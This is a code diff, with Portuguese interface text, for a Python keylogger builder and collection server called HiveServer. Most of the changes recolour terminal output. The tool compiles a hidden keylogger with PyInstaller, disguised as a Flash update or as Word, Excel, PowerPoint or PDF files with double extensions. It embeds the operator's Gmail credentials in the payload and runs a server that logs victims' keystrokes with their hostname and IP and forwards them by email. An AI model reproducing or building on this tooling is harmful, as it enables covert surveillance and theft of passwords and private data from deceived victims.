@@ -14,20 +14,17 @@ import threading
 import time
 import random
 import string
-import subprocess
+import shutil
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
 import getpass
 
-# Cores para terminal
-BLUE = '\033[94m'
-RED = '\033[91m'
+# Cores para terminal (apenas Branco, Amarelo, Vermelho)
 WHITE = '\033[97m'
 YELLOW = '\033[93m'
-MAGENTA = '\033[1;35m'
-GREEN = '\033[1;32m'
+RED = '\033[91m'
 END = '\033[0m'
 
 # Configurações
@@ -61,7 +58,7 @@ class HiveServer:
                     self.email = config.get('email')
                     self.epass = config.get('password')
                     self.server_url = config.get('server_url', f'http://{self.get_local_ip()}:{PORT}/log')
-                    print(f"{GREEN}[+] Configurações carregadas de {CONFIG_FILE}{END}")
+                    print(f"{WHITE}[+] Configurações carregadas de {CONFIG_FILE}{END}")
                     return True
             except:
                 print(f"{RED}[-] Erro ao carregar configurações{END}")
@@ -79,7 +76,7 @@ class HiveServer:
         try:
             with open(CONFIG_FILE, 'w') as f:
                 json.dump(config, f, indent=4)
-            print(f"{GREEN}[+] Configurações salvas em {CONFIG_FILE}{END}")
+            print(f"{WHITE}[+] Configurações salvas em {CONFIG_FILE}{END}")
             return True
         except Exception as e:
             print(f"{RED}[-] Erro ao salvar configurações: {e}{END}")
@@ -97,21 +94,21 @@ class HiveServer:
         print(f"\n{YELLOW}[!] Configure as credenciais para envio de logs{END}")
         print(f"{WHITE}[*] Será usado para enviar logs por e-mail{END}\n")
         
-        email = input(f"{RED}📧 E-mail Gmail: {END}").strip()
-        epass = getpass.getpass(f"{RED}🔑 Senha do Gmail: {END}")
+        email = input(f"{YELLOW}📧 E-mail Gmail: {END}").strip()
+        epass = getpass.getpass(f"{YELLOW}🔑 Senha do Gmail: {END}")
         
         # Obtém IP local para URL do servidor
         local_ip = self.get_local_ip()
         default_url = f'http://{local_ip}:{PORT}/log'
-        server_url = input(f"{GREEN}🌐 URL do servidor (Enter para {default_url}): {END}").strip()
+        server_url = input(f"{WHITE}🌐 URL do servidor (Enter para {default_url}): {END}").strip()
         if not server_url:
             server_url = default_url
         
-        print(f"\n{BLUE}╔════════════════════════════════════════════════════════════╗{END}")
-        print(f"{WHITE}  E-mail: {GREEN}{email}{END}")
-        print(f"{WHITE}  Senha:  {GREEN}{'*' * len(epass)}{END}")
-        print(f"{WHITE}  URL:    {GREEN}{server_url}{END}")
-        print(f"{BLUE}╚════════════════════════════════════════════════════════════╝{END}")
+        print(f"\n{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
+        print(f"{WHITE}  E-mail: {YELLOW}{email}{END}")
+        print(f"{WHITE}  Senha:  {YELLOW}{'*' * len(epass)}{END}")
+        print(f"{WHITE}  URL:    {YELLOW}{server_url}{END}")
+        print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
         
         confirm = input(f"\n{WHITE}Deseja salvar estas credenciais? (s/N): {END}").strip().lower()
         
@@ -120,7 +117,7 @@ class HiveServer:
             self.epass = epass
             self.server_url = server_url
             self.save_config(email, epass, server_url)
-            print(f"{GREEN}[+] Credenciais salvas com sucesso!{END}")
+            print(f"{WHITE}[+] Credenciais salvas com sucesso!{END}")
         else:
             print(f"{YELLOW}[!] Credenciais não salvas. Use temporariamente.{END}")
             self.email = email
@@ -136,9 +133,9 @@ class HiveServer:
     def build_keylogger(self):
         """Constrói o keylogger com PyInstaller"""
         clear()
-        print(f"""{BLUE}
+        print(f"""{WHITE}
 ╔════════════════════════════════════════════════════════════╗
-║              GERADOR DE KEYLOGGER - HIVE                   ║
+║              {YELLOW}GERADOR DE KEYLOGGER - HIVE{WHITE}                   ║
 ╚════════════════════════════════════════════════════════════╝
 {END}""")
         
@@ -156,9 +153,9 @@ class HiveServer:
             input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
             return
         
-        print(f"\n{WHITE}[*] Usando template: {GREEN}{template_path}{END}")
-        print(f"{WHITE}[*] E-mail: {GREEN}{self.email}{END}")
-        print(f"{WHITE}[*] URL do Servidor: {GREEN}{self.server_url}{END}")
+        print(f"\n{WHITE}[*] Usando template: {YELLOW}{template_path}{END}")
+        print(f"{WHITE}[*] E-mail: {YELLOW}{self.email}{END}")
+        print(f"{WHITE}[*] URL do Servidor: {YELLOW}{self.server_url}{END}")
         
         confirm = input(f"\n{WHITE}Deseja continuar com estas configurações? (s/N): {END}").strip().lower()
         if confirm != 's':
@@ -176,42 +173,44 @@ class HiveServer:
         payload += '# Keylogger gerado pelo BLACKBOX HiveServer\n'
         payload += '# Author: Guilherme Alexander\n'
         payload += '# https://github.com/Guilherme-alexander\n\n'
+        payload += '# ============================================================\n'
+        payload += '# CONFIGURAÇÕES INJETADAS PELO HIVESERVER\n'
+        payload += '# ============================================================\n'
         payload += f'EEMAIL = "{self.email}"\n'
         payload += f'EPASS = "{self.epass}"\n'
-        payload += f'SERVER_URL = "{self.server_url}"\n\n'
+        payload += f'SERVER_URL = "{self.server_url}"\n'
+        payload += '# ============================================================\n\n'
         payload += str(o)
         
         # Salva o arquivo temporário
         with open('k.py', 'w', encoding='utf-8') as f:
             f.write(payload)
         
-        print(f"\n{BLUE}[*] Construindo keylogger...{END}")
+        print(f"\n{WHITE}[*] Construindo keylogger...{END}")
         
         # Comando PyInstaller
         if sys.platform == 'win32':
             pyinstaller = 'pyinstaller'
-            python_cmd = 'python'
         else:
             # Para Linux com Wine
             if os.path.exists('/root/.wine/drive_c/Python27/python.exe'):
                 pyinstaller = '/root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py'
             else:
-                # Fallback para pyinstaller local
                 pyinstaller = 'pyinstaller'
         
         # Menu de opções de build
         print(f"\n{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
         print(f"{WHITE}║           SELECIONE O TIPO DE KEYLOGGER                    ║{END}")
         print(f"{WHITE}╠════════════════════════════════════════════════════════════╣{END}")
-        print(f"{WHITE}║  [{GREEN}1{WHITE}] Adobe Flash Update   (Ícone Flash)                ║{END}")
-        print(f"{WHITE}║  [{GREEN}2{WHITE}] Fake Word docx      (Ícone Word)                  ║{END}")
-        print(f"{WHITE}║  [{GREEN}3{WHITE}] Fake Excel xlsx     (Ícone Excel)                  ║{END}")
-        print(f"{WHITE}║  [{GREEN}4{WHITE}] Fake Powerpoint pptx(Ícone PowerPoint)             ║{END}")
-        print(f"{WHITE}║  [{GREEN}5{WHITE}] Fake Acrobat pdf   (Ícone PDF)                    ║{END}")
-        print(f"{WHITE}║  [{GREEN}6{WHITE}] Blank Executable   (Sem ícone)                    ║{END}")
+        print(f"{WHITE}║  [{YELLOW}1{WHITE}] Adobe Flash Update   (Ícone Flash)                    ║{END}")
+        print(f"{WHITE}║  [{YELLOW}2{WHITE}] Fake Word docx      (Ícone Word)                      ║{END}")
+        print(f"{WHITE}║  [{YELLOW}3{WHITE}] Fake Excel xlsx     (Ícone Excel)                     ║{END}")
+        print(f"{WHITE}║  [{YELLOW}4{WHITE}] Fake Powerpoint pptx (Ícone PowerPoint)               ║{END}")
+        print(f"{WHITE}║  [{YELLOW}5{WHITE}] Fake Acrobat pdf   (Ícone PDF)                        ║{END}")
+        print(f"{WHITE}║  [{YELLOW}6{WHITE}] Blank Executable   (Sem ícone)                        ║{END}")
         print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
         
-        build_choice = input(f"\n{GREEN} HIVE >> {END}").strip()
+        build_choice = input(f"\n{YELLOW} HIVE >> {END}").strip()
         
         # Configurações de build
         configs = {
@@ -219,42 +218,42 @@ class HiveServer:
                 'version': 'Resource/adobe.template',
                 'icon': 'Icons/flash.ico',
                 'name': 'Bee_Flash_.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Adobe Flash Update'
             },
             '2': {
                 'version': 'Resource/word.template',
                 'icon': 'Icons/word.ico',
                 'name': 'Bee_Word_.docx.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Fake Word docx'
             },
             '3': {
                 'version': 'Resource/excel.template',
                 'icon': 'Icons/excel.ico',
                 'name': 'Bee_Excel_.xlsx.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Fake Excel xlsx'
             },
             '4': {
                 'version': 'Resource/powerpoint.template',
                 'icon': 'Icons/powerpoint.ico',
                 'name': 'Bee_Power_.pptx.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Fake Powerpoint pptx'
             },
             '5': {
                 'version': 'Resource/acrobat.template',
                 'icon': 'Icons/acrobat.ico',
                 'name': 'Bee_AcrobatPDF_.pdf.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Fake Acrobat pdf'
             },
             '6': {
                 'version': None,
                 'icon': None,
                 'name': 'Bee.exe',
-                'manifest': '-m Manifest/manifest.manifest',
+                'manifest': '--manifest=Manifest/manifest.manifest',
                 'desc': 'Blank Executable'
             }
         }
@@ -267,12 +266,12 @@ class HiveServer:
         
         # Remove pasta dist anterior
         if os.path.exists('dist'):
-            os.system('rm -Rf dist' if os.name == 'posix' else 'rmdir /s dist')
+            shutil.rmtree('dist', ignore_errors=True)
         
         # Monta comando
         cmd = f'{pyinstaller} --noconsole'
         
-        if config['manifest']:
+        if config['manifest'] and os.path.exists('Manifest/manifest.manifest'):
             cmd += f' {config["manifest"]}'
         
         if config['version'] and os.path.exists(config['version']):
@@ -283,14 +282,14 @@ class HiveServer:
         
         cmd += ' -F k.py'
         
-        print(f"\n{BLUE}[*] Executando: {cmd}{END}")
+        print(f"\n{WHITE}[*] Executando: {cmd}{END}")
         os.system(cmd)
         
         # Limpeza
         for item in ['build', 'k.spec', 'k.py']:
             if os.path.exists(item):
                 if os.path.isdir(item):
-                    os.system(f'rm -Rf {item}' if os.name == 'posix' else f'rmdir /s {item}')
+                    shutil.rmtree(item, ignore_errors=True)
                 else:
                     try:
                         os.remove(item)
@@ -301,17 +300,23 @@ class HiveServer:
         if os.path.exists('dist/k.exe'):
             os.rename('dist/k.exe', 'dist/' + config['name'])
             clear()
-            print(f"""{GREEN}
+            print(f"""{WHITE}
 ╔════════════════════════════════════════════════════════════╗
-║                  ✅ KEYLOGGER GERADO                       ║
+║                    {YELLOW}✅ KEYLOGGER GERADO{WHITE}                     ║
 ╠════════════════════════════════════════════════════════════╣
-║  Tipo: {WHITE}{config['desc']}{GREEN}                                     ║
-║  Arquivo: {WHITE}{config['name']}{GREEN}                                  ║
-║  Local: {WHITE}dist/{config['name']}{GREEN}                               ║
-║  E-mail: {WHITE}{self.email}{GREEN}                                       ║
-║  Servidor: {WHITE}{self.server_url}{GREEN}                                ║
+║  Tipo: {YELLOW}{config['desc']}{WHITE}                      
+║  Arquivo: {YELLOW}{config['name']}{WHITE}                   
+║  Local: {YELLOW}dist/{config['name']}{WHITE}                
+║  E-mail: {YELLOW}{self.email}{WHITE}                        
+║  Servidor: {YELLOW}{self.server_url}{WHITE}                 
 ╚════════════════════════════════════════════════════════════╝
 {END}""")
+            
+            # Pergunta se quer testar
+            test = input(f"\n{WHITE}Deseja testar o keylogger agora? (s/N): {END}").strip().lower()
+            if test == 's':
+                print(f"{WHITE}[*] Executando keylogger...{END}")
+                os.system(f'dist/{config["name"]}')
         else:
             print(f"{RED}[-] Erro ao gerar keylogger!{END}")
         
@@ -337,7 +342,7 @@ class HiveServer:
             server.send_message(msg)
             server.quit()
             
-            print(f"{GREEN}[+] E-mail enviado: {subject}{END}")
+            print(f"{WHITE}[+] E-mail enviado: {subject}{END}")
             return True
             
         except Exception as e:
@@ -363,7 +368,7 @@ class HiveServer:
             with open(filename, 'a', encoding='utf-8') as f:
                 f.write(log_entry)
             
-            print(f"{GREEN}[+] Log salvo de {hostname} ({client_ip}) - {len(log_data)} caracteres{END}")
+            print(f"{WHITE}[+] Log salvo de {hostname} ({client_ip}) - {len(log_data)} caracteres{END}")
             
             # Envia por e-mail se configurado
             if self.email and self.epass:
@@ -380,7 +385,7 @@ class HiveServer:
     def view_logs(self):
         """Exibe os logs armazenados"""
         clear()
-        print(f"""{BLUE}
+        print(f"""{WHITE}
 ╔════════════════════════════════════════════════════════════╗
 ║                    VISUALIZAR LOGS                         ║
 ╚════════════════════════════════════════════════════════════╝
@@ -396,7 +401,7 @@ class HiveServer:
         print(f"{WHITE}Arquivos de log disponíveis:{END}\n")
         for i, file in enumerate(log_files, 1):
             size = os.path.getsize(os.path.join(LOG_DIR, file))
-            print(f"  {GREEN}[{i}]{END} {file} ({size} bytes)")
+            print(f"  {YELLOW}[{i}]{END} {file} ({size} bytes)")
         
         choice = input(f"\n{WHITE}Selecione um arquivo (0 para voltar): {END}").strip()
         
@@ -408,9 +413,9 @@ class HiveServer:
             if 0 <= idx < len(log_files):
                 filepath = os.path.join(LOG_DIR, log_files[idx])
                 clear()
-                print(f"{BLUE}╔════════════════════════════════════════════════════════════╗{END}")
-                print(f"{WHITE}  Arquivo: {GREEN}{log_files[idx]}{END}")
-                print(f"{BLUE}╚════════════════════════════════════════════════════════════╝{END}\n")
+                print(f"{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
+                print(f"{WHITE}  Arquivo: {YELLOW}{log_files[idx]}{END}")
+                print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}\n")
                 
                 with open(filepath, 'r', encoding='utf-8') as f:
                     content = f.read()
@@ -518,12 +523,12 @@ class HiveServer:
         try:
             self.server = HTTPServer((HOST, PORT), LogHandler)
             self.running = True
-            print(f"{GREEN}╔════════════════════════════════════════════════════════════╗{END}")
-            print(f"{GREEN}║           🐝 HIVE SERVER INICIADO COM SUCESSO              ║{END}")
-            print(f"{GREEN}╚════════════════════════════════════════════════════════════╝{END}")
-            print(f"\n{WHITE}[+] Servidor rodando em: {GREEN}http://{self.get_local_ip()}:{PORT}{END}")
-            print(f"{WHITE}[+] Endpoint para logs: {GREEN}POST http://{self.get_local_ip()}:{PORT}/log{END}")
-            print(f"{WHITE}[+] Pasta de logs: {GREEN}{os.path.abspath(LOG_DIR)}{END}")
+            print(f"{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
+            print(f"{WHITE}║           {YELLOW}🐝 HIVE SERVER INICIADO COM SUCESSO{WHITE}              ║{END}")
+            print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
+            print(f"\n{WHITE}[+] Servidor rodando em: {YELLOW}http://{self.get_local_ip()}:{PORT}{END}")
+            print(f"{WHITE}[+] Endpoint para logs: {YELLOW}POST http://{self.get_local_ip()}:{PORT}/log{END}")
+            print(f"{WHITE}[+] Pasta de logs: {YELLOW}{os.path.abspath(LOG_DIR)}{END}")
             print(f"{WHITE}[+] Pressione {YELLOW}CTRL+C{WHITE} para parar o servidor{END}\n")
             
             self.server.serve_forever()
@@ -576,7 +581,7 @@ def menu():
     while True:
         banner()
         
-        choice = input(f"{GREEN} HIVE >> {END}").strip()
+        choice = input(f"{YELLOW} [+] HIVE (🐝) >> {END}").strip()
         
         if choice == '1':
             # Inicia servidor
@@ -606,7 +611,7 @@ def menu():
                 for file in os.listdir(LOG_DIR):
                     if file.endswith('.log'):
                         os.remove(os.path.join(LOG_DIR, file))
-                print(f"{GREEN}[+] Logs limpos!{END}")
+                print(f"{WHITE}[+] Logs limpos!{END}")
                 time.sleep(1)
                 
         elif choice == '0':
